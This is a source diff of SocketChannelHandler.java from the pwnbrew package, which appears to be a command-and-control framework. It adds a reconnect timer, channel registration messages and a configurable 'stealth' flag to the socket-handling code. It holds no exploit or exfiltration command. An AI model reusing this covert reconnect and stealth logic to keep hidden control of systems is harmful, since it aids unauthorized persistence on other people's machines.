@@ -36,13 +36,6 @@ The copyright on this package is held by Securifera, Inc
 
 */
 
-
-/*
-* SocketChannelHandler.java
-*
-* Created on June 2, 2013, 9:12:00 PM
-*/
-
 package pwnbrew.selector;
 
 import java.io.IOException;
@@ -60,6 +53,7 @@ import pwnbrew.log.LoggableException;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.ConnectionManager;
 import pwnbrew.manager.DataManager;
+import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.Message;
 import pwnbrew.network.PortRouter;
@@ -72,6 +66,7 @@ import pwnbrew.network.relay.RelayManager;
 import pwnbrew.network.socket.SocketChannelWrapper;
 import pwnbrew.utilities.Constants;
 import pwnbrew.utilities.DebugPrinter;
+import pwnbrew.utilities.ReconnectTimer;
 import pwnbrew.utilities.SocketUtilities;
 
 /**
@@ -105,7 +100,6 @@ public class SocketChannelHandler implements Selectable {
     
     private boolean isRegistered = false;
     
-//    private int lockVal = 0;
     
     // ==========================================================================
     /**
@@ -412,14 +406,28 @@ public class SocketChannelHandler implements Selectable {
                                                         if( !aMsg.keepWrapping() )
                                                             setWrapping( false);
 
-                                                        if( thePR instanceof ClientPortRouter ){
+                                                        if( aCM instanceof OutgoingConnectionManager ){
 
-                                                            //Create callback
-                                                            SocketChannelCallback aSCC = new SocketChannelCallback(serverIp, theSocketPort, aMsg, aCM);
+                                                            //Create the Timer
+                                                            OutgoingConnectionManager theOCM = (OutgoingConnectionManager)aCM;
+                                                            int newChannelId = theOCM.getNextChannelId();
+                                                            ReconnectTimer aReconnectTimer = new ReconnectTimer(aSPR.getPortManager(), newChannelId); 
+                                                            byte stlth_val = 0;
+                                                            if( theConf.useStealth() )
+                                                                stlth_val = 1;   
 
+                                                            //Queue register message
+                                                            RegisterMessage regMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, newChannelId);
+                                                            aReconnectTimer.setPostConnectMessage(regMsg);
+                                                            
                                                             //TODO need to check if the id is taken
-                                                            ClientPortRouter aCPR = (ClientPortRouter)thePR;
-                                                            aCPR.ensureConnectivity(aSCC );
+                                                            //ClientPortRouter aCPR = (ClientPortRouter)thePR;
+                                                            //aCPR.ensureConnectivity(aSCC );
+                                                            
+                                                            //Create callback
+                                                            SocketChannelCallback aSCC = new SocketChannelCallback(serverIp, theSocketPort, aMsg, aCM, aReconnectTimer);
+                                                            aReconnectTimer.setConnectionCallback(aSCC);
+                                                            aReconnectTimer.start();       
 
                                                         }
                                                     } else {
@@ -506,6 +514,7 @@ public class SocketChannelHandler implements Selectable {
 
             } else  if(bytesRead == 0){
 
+                DebugPrinter.printMessage( this.getClass().getSimpleName(), "Nothing to receive. Sleeping. channel " + Integer.toString(channelId));
                 try {
                     Thread.sleep(100);
                 } catch (InterruptedException ex) {
@@ -565,13 +574,7 @@ public class SocketChannelHandler implements Selectable {
                             retrySend(nextItem);    
                         }                            
                     }
-                        
-//                }  else {
-                    
-//                    SocketChannel aSC = getSocketChannel();
-//                    if( aSC != null ){
-//                        thePortRouter.getSelRouter().changeOps( aSC, SelectionKey.OP_READ);
-//                    }
+                  
                 }
 
                 //Notify any threads waiting on this monitor
